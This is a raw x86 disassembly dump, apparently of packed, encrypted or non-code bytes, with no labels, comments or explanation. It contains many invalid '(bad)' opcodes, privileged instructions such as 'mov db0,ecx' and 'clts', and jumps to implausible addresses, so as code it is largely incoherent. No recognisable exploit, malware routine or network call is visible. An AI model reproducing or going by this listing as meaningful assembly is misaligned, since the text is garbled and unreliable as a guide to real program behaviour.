  427afe:	scas   eax,DWORD PTR es:[edi]
  427aff:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  427b05:	add    BYTE PTR [ebx],ch
  427b07:	jmp    0xb97c47
  427b0c:	mov    eax,DWORD PTR [ebp-0x5c]
  427b0f:	mov    eax,DWORD PTR [ebp-0x14]
  427b12:	inc    ebp
  427b13:	enter  0x458b,0xf8
  427b17:	xor    eax,ebx
  427b19:	add    ecx,ebx
  427b1b:	cmp    ecx,esi
  427b1d:	shufps xmm7,xmm4,0xaf
  427b21:	add    BYTE PTR [ebx+0x55e8f48b],cl
  427b27:	dec    ebp
  427b28:	sub    esi,DWORD PTR [ebx]
  427b2a:	cmp    esi,DWORD PTR [ebx]
  427b2c:	ja     0x427b31
  427b2e:	mov    eax,DWORD PTR [ebx]
  427b30:	lods   al,BYTE PTR ds:[esi]
  427b31:	mov    db0,ecx
  427b34:	inc    ebp
  427b35:	dec    ebp
  427b36:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  427b3c:	retf   
  427b3d:	rol    dh,1
  427b3f:	or     al,0xce
  427b41:	inc    ebp
  427b42:	scas   eax,DWORD PTR es:[edi]
  427b43:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  427b49:	add    BYTE PTR [ebx],ch
  427b4b:	add    BYTE PTR [ebx],bh
  427b4d:	inc    ebp
  427b4e:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  427b54:	inc    ebp
  427b55:	retf   
  427b56:	mov    ecx,esi
  427b58:	clc    
  427b59:	(bad)  
  427b5a:	retf   
  427b5b:	scas   eax,DWORD PTR es:[edi]
  427b5c:	ret    
  427b5d:	mov    ecx,esi
  427b5f:	hlt    
  427b60:	(bad)  
  427b61:	push   ebp
  427b62:	scas   eax,DWORD PTR es:[edi]
  427b63:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  427b69:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  427b6f:	add    BYTE PTR [ebx],al
  427b71:	mov    eax,eax
  427b73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b74:	inc    ebp
  427b75:	dec    ebp
  427b76:	cmp    BYTE PTR [ebx],dh
  427b78:	pushf  
  427b79:	xor    ecx,DWORD PTR [ecx+0x4503d003]
  427b7f:	(bad)  
  427b81:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  427b89:	sar    eax,1
  427b8b:	rol    BYTE PTR [ebp+0x5],1
  427b8e:	xor    eax,DWORD PTR [ebp+0x3]
  427b91:	jmp    0x427b7e
  427b93:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  427b99:	xor    eax,DWORD PTR [ebp+0x33]
  427b9c:	mov    eax,DWORD PTR [ebx]
  427b9e:	rol    BYTE PTR [ebx],1
  427ba0:	test   BYTE PTR [edi],cl
  427ba2:	cwde   
  427ba3:	shl    DWORD PTR [edx],0x4d
  427ba6:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  427bac:	xor    edx,eax
  427bae:	add    eax,DWORD PTR ds:0xeb4d45e0
  427bb4:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  427bba:	add    BYTE PTR [ebx],dh
  427bbc:	inc    ebp
  427bbd:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  427bc3:	rdpmc  
  427bc5:	rol    DWORD PTR [ebx],0x4d
  427bc8:	loopne 0x427b55
  427bca:	push   ebp
  427bcb:	in     al,dx
  427bcc:	mov    cl,dl
  427bce:	adc    eax,edx
  427bd0:	jb     0x427bd7
  427bd2:	add    BYTE PTR [ebp+0x45],al
  427bd5:	jmp    0x427b62
  427bd7:	mov    ebx,eax
  427bd9:	test   al,0xcb
  427bdb:	dec    ebp
  427bdc:	dec    ebp
  427bdd:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  427be3:	add    ebx,DWORD PTR [eax-0x743ecdf1]
  427be9:	dec    ebp
  427bea:	mov    al,0x8b
  427bec:	dec    ebp
  427bed:	in     al,dx
  427bee:	xor    edx,ecx
  427bf0:	xor    edx,eax
  427bf2:	add    eax,DWORD PTR [ebp+0x3]
  427bf5:	jbe    0x427c06
  427bf7:	mov    eax,ecx
  427bf9:	test   al,0x45
  427bfb:	dec    ebp
  427bfc:	mov    DWORD PTR [ebx],esi
  427bfe:	loopne 0x427c33
  427c00:	inc    ebp
  427c01:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  427c07:	rol    esi,0x45
  427c0a:	scas   eax,DWORD PTR es:[edi]
  427c0b:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  427c11:	mov    eax,ecx
  427c13:	hlt    
  427c14:	dec    ebp
  427c15:	inc    ebp
  427c16:	mov    eax,edi
  427c18:	loopne 0x427bf2
  427c1a:	retf   
  427c1b:	test   esi,ecx
  427c1d:	clc    
  427c1e:	scas   eax,DWORD PTR es:[edi]
  427c1f:	inc    ebp
  427c20:	mov    eax,edi
  427c22:	fdiv   st,st(0)
  427c24:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  427c2a:	cwde   
  427c2b:	cmp    dh,BYTE PTR [edx]
  427c2d:	pushf  
  427c2e:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  427c34:	inc    esi
  427c36:	mov    ebp,DWORD PTR [eax-0x10]
  427c39:	inc    ebp
  427c3a:	dec    ebp
  427c3b:	xor    esi,DWORD PTR [ebx]
  427c3d:	add    eax,DWORD PTR [ebx]
  427c3f:	loopne 0x427c50
  427c41:	dec    ebp
  427c42:	ror    DWORD PTR [edx+0x7233084d],0x3
  427c49:	add    BYTE PTR [ebx-0x7b740bbb],cl
  427c4f:	lock cwde 
  427c51:	ret    
  427c52:	xor    al,BYTE PTR [ebp-0x77]
  427c55:	mov    esi,esp
  427c57:	rol    BYTE PTR [ebp-0x7c],1
  427c5a:	xor    ebx,DWORD PTR [eax-0x7772cd47]
  427c60:	call   edi
  427c62:	enter  0x4d45,0x8b
  427c66:	mov    esi,eax
  427c68:	fmul   st(3),st
  427c6a:	push   ebp
  427c6b:	dec    ebp
  427c6c:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  427c72:	ret    0xc198
  427c75:	xor    al,BYTE PTR [esi-0x280276]
  427c7b:	dec    ebp
  427c7c:	jne    0x427cb1
  427c7e:	mov    eax,DWORD PTR [ebx]
  427c80:	cld    
  427c81:	loopne 0x427c33
  427c83:	push   ebp
  427c84:	add    DWORD PTR [eax+0x72851100],ecx
  427c8a:	inc    DWORD PTR [eax]
  427c8c:	inc    DWORD PTR [ebp-0x75]
  427c8f:	mov    edi,esp
  427c91:	lock add bl,0x1
  427c95:	retf   
  427c96:	add    dh,al
  427c98:	xor    dh,cl
  427c9a:	inc    ebp
  427c9b:	scas   eax,DWORD PTR es:[edi]
  427c9c:	mov    eax,DWORD PTR [ebx]
  427c9e:	shl    al,0x0
  427ca1:	inc    ebp
  427ca2:	dec    DWORD PTR [ebx+0x4dccf0ff]
  427ca8:	call   0x458ee0
  427cad:	ud0    eax,ecx
  427cb0:	adc    al,0x4d
  427cb2:	inc    ebp
  427cb3:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  427cb9:	lock push 0x338055
  427cbf:	add    eax,DWORD PTR [eax]
  427cc1:	ud0    ecx,edx
  427cc4:	sbb    BYTE PTR [ebp+0x5e],dl
  427cc7:	xor    ecx,ecx
  427cc9:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  427cd0:	push   ecx
  427cd1:	add    BYTE PTR [ebp-0x38],cl
  427cd4:	mov    DWORD PTR [esi-0x740004],eax
  427cda:	cld    
  427cdb:	inc    ebp
  427cdc:	xchg   edx,eax
  427cdd:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  427ce3:	xabort 0xaf
  427ce6:	icebp  
  427ce7:	mov    esi,DWORD PTR [ebp-0x28]
  427cea:	(bad)  
  427ceb:	retf   
  427cec:	or     ecx,eax
  427cee:	(bad)  
  427cef:	dec    ebp
  427cf0:	pop    es
  427cf1:	(bad)  
  427cf2:	(bad)  
  427cf3:	or     BYTE PTR [esi],al
  427cf5:	jb     0x427cbd
  427cf7:	add    BYTE PTR [ebx],al
  427cf9:	inc    ebp
  427cfa:	(bad)  
  427cfb:	mov    ecx,DWORD PTR [edx]
  427cfd:	fadd   st(6),st
  427cff:	ret    
  427d00:	add    ch,BYTE PTR [eax-0x37]
  427d03:	int    0x55
  427d05:	sub    ebp,esp
  427d07:	add    edx,DWORD PTR [ecx-0x14]
  427d0a:	inc    ebp
  427d0b:	inc    ebp
  427d0c:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  427d12:	cld    
  427d13:	(bad)  
  427d14:	mov    gs,WORD PTR [edi+0xf893be0]
  427d1a:	mov    ebp,ebp
  427d1c:	clc    
  427d1d:	push   eax
  427d1f:	push   DWORD PTR [ebp-0x4]
  427d22:	mov    BYTE PTR [ebp+0xa],0xff
  427d26:	(bad)  
  427d27:	int3   
  427d28:	or     BYTE PTR [eax],al
  427d2a:	(bad)  
  427d2b:	lea    eax,[edi]
  427d2d:	ins    BYTE PTR es:[edi],dx
  427d2e:	(bad)  
  427d2f:	inc    DWORD PTR [ecx]
  427d31:	push   eax
  427d32:	mov    BYTE PTR [ebp+0x9],0x8b
  427d36:	leave  
  427d37:	les    edx,FWORD PTR [ebp+0x0]
  427d3a:	in     al,dx
  427d3b:	call   DWORD PTR [ecx-0x75]
  427d3e:	inc    ebp
  427d3f:	cld    
  427d40:	mov    DWORD PTR [eax+0x8b01fc],eax
  427d46:	cld    
  427d47:	xor    BYTE PTR [edi-0x76a8f98b],bh
  427d4d:	std    
  427d4e:	mov    eax,DWORD PTR [eax]
  427d50:	clc    
  427d51:	test   eax,esi
  427d53:	je     0x427dca
  427d55:	mov    eax,esi
  427d57:	cld    
  427d58:	add    al,0x80
  427d5a:	add    WORD PTR [ecx+0x0],ax
  427d5e:	fadd   QWORD PTR [eax]
  427d60:	mov    BYTE PTR [eax],0xd0
  427d63:	push   0xffffffc3
  427d65:	push   edi
  427d66:	mov    edx,DWORD PTR [eax+0x51]
  427d69:	pop    edi
  427d6a:	lea    ebx,[ebx-0x8]
  427d6d:	ret    0x45
  427d70:	mov    ecx,DWORD PTR [ebx-0x7241ae04]
  427d76:	xchg   eax,edi
  427d78:	mov    DWORD PTR [ebp-0x75],ecx
  427d7b:	push   esi
  427d7c:	clc    
  427d7d:	jne    0x427d4f
  427d7f:	mov    ecx,0xf8450b0b
  427d84:	(bad)  
  427d85:	push   cs
  427d86:	or     BYTE PTR [ebp-0x3a],dh
  427d89:	cmp    eax,DWORD PTR [ecx]
  427d8b:	pop    esi
  427d8c:	(bad)  
  427d8d:	or     al,0x5
  427d8f:	inc    eax
  427d90:	leave  
  427d91:	in     al,dx
  427d92:	add    al,0x42
  427d94:	push   esi
  427d95:	and    eax,0xedc940cf
  427d9a:	inc    DWORD PTR [eax-0x75]
  427d9d:	fmul   QWORD PTR [ebx-0xf8739be]
  427da3:	inc    eax
  427da4:	nop
  427da5:	jmp    0x518b:0x8b8bc3ff
  427dac:	(bad)  
  427dad:	lea    eax,ds:0xff45e8f8
  427db3:	push   esi
  427db4:	push   DWORD PTR [ebp-0x39]
  427db7:	mov    eax,0x7edda46
  427dbc:	or     al,0x6
  427dbe:	push   DWORD PTR [ebp-0x3a]
  427dc1:	cmp    eax,DWORD PTR [edx]
  427dc3:	pop    esi
  427dc4:	ret    
  427dc5:	or     al,0x56
  427dc7:	inc    ecx
  427dc8:	push   ebp
  427dc9:	js     0x427db7
  427dcb:	inc    edx
  427dcc:	inc    ebp
  427dcd:	int    0x1
  427dcf:	inc    ecx
  427dd0:	sub    BYTE PTR ds:0xe77541fc,ah
  427dd6:	add    DWORD PTR [edx+0x1c],eax
  427dd9:	int3   
  427dda:	mov    eax,ebx
  427ddc:	adc    al,0x8b
  427dde:	xchg   edx,eax
  427ddf:	push   ecx
  427de0:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  427de6:	rcl    DWORD PTR [esi-0x9],cl
  427de9:	jne    0x427e3b
  427deb:	mov    eax,0x7c80ece
  427df0:	rol    DWORD PTR [esi],cl
  427df2:	div    DWORD PTR [ebp+0x50]
  427df5:	cmp    ecx,edx
  427df7:	pop    esi
  427df8:	dec    BYTE PTR [edx]
  427dfa:	in     al,dx
  427dfb:	inc    edx
  427dfc:	sub    ebp,ecx
  427dfe:	inc    eax
  427dff:	(bad)  
  427e00:	push   eax
  427e01:	add    edx,DWORD PTR [eax-0x17]
  427e04:	push   edi
  427e05:	add    dh,dh
  427e07:	leave  
  427e08:	adc    DWORD PTR [ebp-0x1],0xffffffec
  427e0c:	add    BYTE PTR [ecx+0x0],dl
  427e0f:	inc    ebp
  427e10:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  427e16:	add    BYTE PTR [eax-0x7fbf448],bh
  427e1c:	add    al,0x2
  427e1e:	jmp    0x57e2978
  427e23:	jne    0x427e0d
  427e25:	mov    eax,DWORD PTR [edx]
  427e27:	or     BYTE PTR [eax],al
  427e29:	inc    ecx
  427e2a:	stc    
  427e2b:	in     eax,dx
  427e2c:	ss inc eax
  427e2e:	aas    
  427e2f:	out    0x7d,eax
  427e31:	inc    ecx
  427e32:	mov    esi,ecx
  427e34:	lock ret 0x7d
  427e38:	and    ecx,DWORD PTR [ebx-0x171777]
  427e3e:	add    bh,bh
  427e40:	aad    0xd7
  427e42:	add    dh,cl
  427e44:	clts   
  427e46:	(bad)  
  427e47:	call   0xffcd7d4c
  427e4c:	hlt    
  427e4d:	iret   
  427e4e:	jge    0x427e26
  427e50:	rol    DWORD PTR [esi-0x80],cl
  427e53:	icebp  
  427e54:	or     BYTE PTR [edi-0x27],cl
  427e57:	(bad)  
  427e58:	out    dx,al
  427e59:	mov    eax,DWORD PTR [ebx]
  427e5b:	(bad)  
  427e5c:	pop    esi
  427e5d:	push   es
  427e5e:	cmp    al,0xe8
  427e60:	sar    edi,0x8
  427e63:	inc    DWORD PTR [edi]
  427e65:	inc    esi
  427e66:	(bad)  
  427e67:	jmp    0x8b00:0x530e577e
  427e6e:	push   esi
  427e6f:	mov    eax,DWORD PTR [eax]
  427e71:	and    al,0x0
  427e73:	inc    ebp
  427e74:	push   eax
  427e75:	push   eax
  427e76:	add    DWORD PTR [ebx+0x757d1834],ecx
  427e7c:	sub    edx,DWORD PTR [esi-0x24]
  427e7f:	jne    0x427e37
  427e81:	lods   eax,DWORD PTR ds:[esi]
  427e82:	mov    edx,DWORD PTR [edx-0x34]
  427e85:	dec    esi
  427e86:	out    0x83,eax
  427e88:	into   
  427e89:	push   edi
  427e8b:	loopne 0x427e5b
  427e8d:	shr    BYTE PTR [edx+ecx*4+0x0],1
  427e91:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  427e98:	rol    DWORD PTR [edx],0x8
  427e9b:	mov    esp,ecx
  427e9d:	cmp    DWORD PTR [ebx],0xc
  427ea0:	mov    esi,0x5001c0
  427ea5:	push   eax
  427ea6:	push   cs
  427ea7:	push   eax
  427ea8:	(bad)  
  427ea9:	sub    edx,edi
  427eab:	push   esi
  427eac:	adc    al,0xcb
  427eae:	ins    DWORD PTR es:[edi],dx
  427eaf:	mov    eax,0x203e8
  427eb4:	add    al,ah
  427eb6:	ror    BYTE PTR [eax+0xc007c0],0xc0
  427ebd:	add    dh,al
  427ebf:	add    ah,ch
  427ec1:	rol    DWORD PTR [ebx-0x3595fb0d],1
  427ec7:	pop    ecx
  427ec8:	or     eax,ebx
  427eca:	cli    
  427ecb:	add    BYTE PTR [ecx-0x4e728d1e],dh
  427ed1:	lea    ebp,[ebx]
  427ed3:	mov    edx,DWORD PTR [edx-0x4]
  427ed6:	dec    ecx
  427ed7:	inc    ebp
  427ed8:	shr    BYTE PTR [ebx],0x4b
  427edb:	and    al,0x0
  427edd:	(bad)  
  427ede:	jne    0x427f25
  427ee0:	pop    eax
  427ee1:	mov    al,0x5a
  427ee3:	call   0x1418142
  427ee8:	and    al,0x85
  427eea:	push   edx
  427eeb:	add    BYTE PTR [eax+eax*1+0x0],ah
  427eef:	dec    ebp
  427ef0:	mov    cl,0x23
  427ef2:	jmp    0x427ee0
  427ef4:	mov    al,0xe7
  427ef6:	call   0x13881e4
  427efb:	shr    DWORD PTR [eax+ebx*2],cl
  427efe:	lock (bad) 
  427f00:	adc    eax,0x757f008d
  427f05:	out    0x58,eax
  427f07:	cmp    al,0x7
  427f09:	pop    edx
  427f0a:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  427f11:	push   ecx
  427f12:	cld    
  427f13:	mov    esi,0x3b0175
  427f18:	and    al,0xb0
  427f1a:	xor    BYTE PTR [edx+0x1],0x8b
  427f1e:	add    ah,bh
  427f20:	mov    edi,DWORD PTR [ebp-0x4]
  427f23:	psubsw mm7,QWORD PTR [edi]
  427f26:	add    DWORD PTR [ebp+0x0],ebp
  427f29:	rcr    eax,1
  427f2b:	mov    edi,ecx
  427f2d:	and    eax,DWORD PTR [eax]
  427f2f:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  427f35:	call   0x12f821e
  427f3a:	add    al,cl
  427f3c:	mov    ebp,esi
  427f3e:	aam    0x83
  427f40:	or     DWORD PTR [ecx],eax
  427f42:	jne    0x427f35
  427f44:	mov    eax,DWORD PTR [eax]
  427f46:	aam    0x0
  427f48:	dec    ebp
  427f49:	jne    0x427ed6
  427f4b:	cmp    ebx,eax
  427f4d:	jb     0x427f9c
  427f4f:	jmp    0x427edc
  427f51:	mov    ebx,esp
  427f53:	int3   
  427f54:	dec    ebp
  427f55:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  427f5c:	mov    edx,0x8b0a8b
  427f61:	cmp    ecx,DWORD PTR [eax]
  427f63:	jb     0x427f3c
  427f65:	pop    edx
  427f66:	push   edi
  427f67:	cli    
  427f68:	pop    es
  427f69:	mov    eax,ecx
  427f6b:	jb     0x427f6f
  427f6d:	add    DWORD PTR [ebx],0xa
  427f70:	mov    eax,DWORD PTR [ebx]
  427f72:	int3   
  427f73:	add    bh,BYTE PTR [esi+0x75d10006]
  427f79:	jmp    0x427f06
  427f7b:	mov    al,0xe8
  427f7d:	call   0x10381ff
  427f82:	add    edx,DWORD PTR [ecx+ecx*8]
  427f85:	pop    edi
  427f86:	or     BYTE PTR [ecx-0x73],bl
  427f89:	pop    ecx
  427f8a:	inc    edi
  427f8b:	xor    al,0xeb
  427f8d:	push   ecx
  427f8e:	mov    edi,DWORD PTR [edx+0xc506cc]
  427f94:	call   0xb18099
  427f99:	int3   
  427f9a:	sbb    BYTE PTR [esi],ch
  427f9c:	inc    ebp
  427f9d:	add    BYTE PTR [ebx-0x1f4f338b],cl
  427fa3:	call   0x9b8212
  427fa8:	or     BYTE PTR [ebx-0x73],dl
  427fab:	cmp    al,0x47
  427fad:	mov    al,0x1
  427faf:	jb     0x427fb1
  427fb1:	mov    al,0x10
  427fb3:	push   eax
  427fb4:	add    al,0x75
  427fb6:	add    BYTE PTR [ebx],ch
  427fb8:	add    ebx,esp
  427fba:	int3   
  427fbb:	jne    0x427fcd
  427fbd:	movsx  edx,cl
  427fc0:	add    DWORD PTR [eax],eax
  427fc2:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  427fc9:	mov    gs,edi
  427fcb:	add    BYTE PTR [eax-0x50],ch
  427fce:	add    al,ch
  427fd0:	mov    eax,DWORD PTR [ecx]
  427fd2:	sub    eax,DWORD PTR [eax]
  427fd4:	jb     0x42804b
  427fd6:	add    DWORD PTR [esp+eiz*8-0x50],esi
  427fda:	jge    0x427fc4
  427fdc:	add    al,0x1
  427fde:	add    DWORD PTR [eax],0x0
  427fe1:	jne    0x427fe3
  427fe3:	je     0x42802a
  427fe5:	mov    eax,DWORD PTR [edi]
  427fe7:	ror    BYTE PTR [ebp+0x4d],1
  427fea:	or     DWORD PTR [ecx+0x4d03d004],0x3
  427ff1:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  427ff7:	mov    DWORD PTR [ebx],ebp
  427ff9:	fadd   DWORD PTR [eax+0x75]
  427ffc:	inc    eax
  427ffd:	pop    eax
  427ffe:	lea    ebx,[ecx+0x4f]
  428001:	push   0xb1000003
  428006:	out    dx,eax
  428007:	add    ebp,DWORD PTR [edx+edx*2]
  42800a:	add    BYTE PTR [ebx+ecx*4],bh
  42800d:	mov    ch,BYTE PTR [ebx]
  42800f:	jb     0x428083
  428011:	add    al,0x89
  428013:	push   eax
  428014:	call   0x842acd86
  428019:	add    DWORD PTR [eax+eax*1],eax
  42801c:	jae    0x428032
  42801e:	icebp  
  42801f:	inc    ebp
  428020:	mov    eax,DWORD PTR gs:[ecx]
  428023:	int3   
  428024:	out    dx,al
  428025:	loopne 0x428074
  428027:	sub    eax,DWORD PTR [edx]
  428029:	push   0xffffff83
  42802b:	pop    esi
  42802c:	push   cs
  42802d:	jl     0x428048
  42802f:	add    al,0xaf
  428031:	xor    eax,0x832b6d00
  428036:	mov    eax,DWORD PTR [edx]
  428038:	rcr    BYTE PTR [ebp+0x754500dc],cl
  42803e:	ror    DWORD PTR [ebx+0x7dc8e803],1
  428044:	inc    ebp
  428045:	shr    ebx,0x3
  428048:	or     DWORD PTR [eax],0x4
  42804b:	push   0xffffffa5
  42804d:	pop    esi
  42804e:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  428055:	jmp    0x4280b4
  428057:	mov    edi,0xff0272
  42805c:	fdivr  QWORD PTR [ebp+0x5d]
  42805f:	push   0x4e
  428061:	pop    ecx
  428062:	call   0x42c467
  428067:	mov    DWORD PTR [ebx],eax
  428069:	in     al,0xc8
  42806b:	rol    BYTE PTR [ebp-0x75],0xc1
  42806f:	call   0xac8250
  428074:	pop    esi
  428075:	enter  0xceff,0x8b
  428079:	repz mov ecx,DWORD PTR [ebp-0x34]
  42807d:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  428084:	je     0x428086
  428086:	or     DWORD PTR [ebx-0x74183b24],eax
  42808c:	jne    0x428072
  42808e:	jmp    0x428089
  428090:	push   DWORD PTR [edx-0x24]
  428093:	push   0x4d
  428095:	pop    ecx
  428096:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  42809a:	jge    0x4280a2
  42809c:	mov    eax,eax
  42809e:	sub    ebp,DWORD PTR [edx+0x24]
  4280a1:	pop    esi
  4280a2:	inc    ebp
  4280a3:	mov    esp,0x8b6077
  4280a8:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  4280ae:	lods   al,BYTE PTR ds:[esi]
  4280af:	add    BYTE PTR [ebx],bh
  4280b1:	enter  0xce73,0x49
  4280b5:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  4280bd:	stc    
  4280be:	jge    0x428132
  4280c0:	jnp    0xdd42042f
  4280c6:	call   0xc5819c
  4280cb:	fadd   st(0),st
  4280cd:	dec    esi
  4280ce:	ins    BYTE PTR es:[edi],dx
  4280cf:	stc    
  4280d0:	cmp    al,0x73
  4280d2:	push   ebp
  4280d3:	mov    eax,0xf8028b
  4280d8:	jne    0x42809b
  4280da:	mov    esi,ecx
  4280dc:	mov    esp,DWORD PTR [ebp+0x2c]
  4280df:	add    edi,DWORD PTR [ebp-0x24]
  4280e2:	sub    esp,eax
  4280e4:	and    al,0x45
  4280e6:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  4280ec:	sbb    al,0xee
  4280ee:	pop    esi
  4280ef:	call   0x82811f
  4280f4:	fsubr  st,st(3)
  4280f6:	sti    
  4280f7:	add    BYTE PTR gs:[ecx],bh
  4280fa:	add    eax,esp
  4280fc:	add    DWORD PTR [esi],eax
  4280fe:	rol    DWORD PTR [ebp+0x8],0x29
  428102:	mov    esp,eax
  428104:	clc    
  428105:	jne    0x42817c
  428107:	mov    eax,0x8b0673
  42810c:	loopne 0x428153
  42810e:	loopne 0x428099
  428110:	lods   al,BYTE PTR ds:[esi]
  428111:	int3   
  428112:	inc    ebp
  428113:	mov    DWORD PTR gs:[eax+edi*8],eax
  428117:	add    al,0xc3
  428119:	sub    ecx,DWORD PTR [ebp+0x47]
  42811c:	(bad)  
  42811e:	shr    BYTE PTR [ebp-0x1f],0xe8
  428122:	add    eax,DWORD PTR [eax]
  428124:	call   0x6444229
  428129:	add    esi,DWORD PTR [esi-0x3b2efc83]
  42812f:	dec    esi
  428130:	ins    DWORD PTR es:[edi],dx
  428131:	in     al,dx
  428132:	lea    eax,[eax]
  428134:	inc    ebp
  428135:	inc    ebp
  428136:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  42813c:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  428146:	and    al,0xdc
  428148:	ror    DWORD PTR [edx+0x24],0xf7
  42814c:	or     BYTE PTR [ebp+0x4c],dh
  42814f:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  428153:	stos   BYTE PTR es:[edi],al
  428154:	adc    edx,edi
  428156:	inc    esp
  428157:	add    edi,DWORD PTR [eax]
  428159:	jne    0x42813e
  42815b:	mov    DWORD PTR [eax-0x7449db04],ecx
  428161:	cmp    ecx,DWORD PTR [edi]
  428163:	sub    BYTE PTR [ebp-0x7e],dl
  428166:	sar    ebp,0xb
  428169:	jmp    FWORD PTR [edi+0x2400392a]
  42816f:	sub    esi,DWORD PTR [ebx-0x73]
  428172:	mov    esp,DWORD PTR [ecx+edi*4]
  428175:	mov    ecx,DWORD PTR [eax]
  428177:	and    BYTE PTR [eax],al
  428179:	jne    0x428145
  42817b:	sub    ebp,ecx
  42817d:	sbb    BYTE PTR [esi+0x32],ah
  428180:	dec    ebp
  428181:	push   ebp
  428182:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  428188:	ret    
  428189:	mov    edx,ebp
  42818b:	leave  
  42818c:	sub    DWORD PTR [esi+0x24],ebx
  42818f:	ret    0x2b
  428192:	pop    ax
  428194:	push   ebp
  428195:	rol    BYTE PTR [ebx],0xeb
  428198:	add    DWORD PTR [ecx+0x6c0001],0x40
  42819f:	jb     0x4281f6
  4281a1:	ret    
  4281a2:	in     al,dx
  4281a3:	jecxz  0x428130
  4281a5:	push   esi
  4281a6:	xchg   esp,eax
  4281a7:	jne    0x4281a9
  4281a9:	cmp    edx,DWORD PTR [esi+0x1c]
  4281ac:	jne    0x428192
  4281ae:	mov    eax,DWORD PTR [ebp-0x77]
  4281b1:	ror    DWORD PTR [ebx+0x899408],0xe0
  4281b8:	mov    esi,DWORD PTR [ebp-0x75]
  4281bb:	pop    esi
  4281bc:	nop
  4281bd:	mov    eax,DWORD PTR [eax]
  4281bf:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  4281c5:	add    al,0x0
  4281c7:	inc    ebp
  4281c8:	mov    eax,DWORD PTR [ebx]
  4281ca:	mov    ebp,ebx
  4281cc:	cmp    al,0xf
  4281ce:	or     al,al
  4281d0:	inc    ebp
  4281d1:	inc    ebp
  4281d2:	cmp    BYTE PTR [ebx+0x6c8bc89c],cl
  4281d8:	cld    
  4281d9:	add    BYTE PTR [edi+0x506c16c0],dh
  4281df:	add    BYTE PTR [ecx-0x5],dl
  4281e2:	add    eax,0x17200
  4281e7:	sbb    al,0x85
  4281e9:	dec    esp
  4281ea:	je     0x428224
  4281ec:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4281f0:	add    BYTE PTR [ebx],bh
  4281f2:	(bad)  
  4281f3:	and    al,0x39
  4281f5:	jae    0x428193
  4281f7:	mov    cl,cl
  4281f9:	inc    DWORD PTR [esp]
  4281fc:	push   ebp
  4281fd:	shr    esp,0x8
  428200:	in     al,dx
  428201:	push   esp
  428202:	add    DWORD PTR [eax],esp
  428204:	add    bl,cl
  428206:	inc    ebp
  428207:	mov    bh,0x89
  428209:	add    ah,bh
  42820b:	jmp    0xca7b9155
  428210:	pushf  
  428211:	dec    esp
  428212:	mov    edx,0xf8178520
  428217:	fst    DWORD PTR [ebp+0x0]
  42821a:	mov    BYTE PTR [eax],0xc4
  42821d:	sub    edx,DWORD PTR [ebx-0x3f]
  428220:	inc    ebp
  428221:	add    eax,0xc601dc
  428226:	mov    al,0xc6
  428229:	ins    BYTE PTR es:[edi],dx
  42822a:	mov    DWORD PTR [eax+0x57],0x2e0545c1
  428231:	dec    esp
  428232:	jmp    DWORD PTR [eax]
  428234:	inc    ebp
  428235:	fnstcw WORD PTR [eax+0x29]
  428238:	test   BYTE PTR [eax],0xc5
  42823b:	rol    BYTE PTR [eax],0xc0
  42823e:	lea    ecx,[ebp-0x3cf0dbcb]
  428244:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  42824a:	inc    esi
  42824b:	add    DWORD PTR [eax],ebx
  42824d:	add    dh,bh
  42824f:	mov    esi,DWORD PTR [edx+0x8]
  428252:	(bad)  
  428253:	fdiv   QWORD PTR ss:[ecx]
  428256:	(bad)  
  428257:	mov    bl,ch
  428259:	add    esi,eax
  42825b:	add    dh,bl
  42825d:	or     esi,eax
  42825f:	mov    dl,0xdf
  428261:	add    esi,eax
  428263:	add    al,ah
  428265:	push   cs
  428266:	mov    BYTE PTR [edx+0xc601e1],0xe2
  42826d:	or     BYTE PTR [ebx],dh
  42826f:	dec    ecx
  428270:	lea    eax,[ebx]
  428272:	xor    eax,0x18fc0fc7
  428277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428278:	repz clc 
  42827a:	add    eax,DWORD PTR [ebp+0x46]
  42827d:	prefetcht0 BYTE PTR [ecx-0x2]
  428281:	xor    eax,0x7c60872
  428286:	mov    esp,0xbd32c698
  42828b:	pop    esi
  42828c:	mov    cl,0xbe
  42828f:	or     al,0xc6
  428291:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
